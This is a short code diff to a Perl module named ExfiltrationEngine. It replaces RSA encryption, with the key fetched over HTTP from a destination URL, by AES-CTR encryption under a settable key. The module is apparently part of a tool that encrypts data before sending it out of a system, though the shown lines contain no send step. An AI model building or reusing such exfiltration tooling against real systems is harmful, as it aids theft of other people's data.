@@ -2,7 +2,7 @@
 
 package ExfiltrationEngine;
 
-use Crypt::PK::RSA;
+use Crypt::AES::CTR;
 use File::stat;
 use LWP::UserAgent;
 use Moose;
@@ -26,18 +26,9 @@ has size => (
     isa =>  'Int'
 );
 
-has pkey => (
-    is      =>  'ro',
-    isa     =>  'Str',
-    default =>  sub {
-        my $self = shift;
-
-        my $userAgent = LWP::UserAgent->new;
-        my $request = HTTP::Request->new('GET', $self->dest);
-
-        my $res = $userAgent->request($request);
-        $self->{pkey} = $res->decoded_content;
-    }
+has encryptionKey => (
+    is  =>  'rw',
+    isa =>  'Str'
 );
 
 sub load {
@@ -57,9 +48,8 @@ sub close {
 
 sub encrypt {
     my($self, $data) = @_;
-    my $pk = Crypt::PK::RSA->new(\$self->pkey);
 
-    return $pk->encrypt($data, 'v1.5');
+    return Crypt::AES::CTR::encrypt($data, $self->encryptionKey, 256);
 }
 
 1;
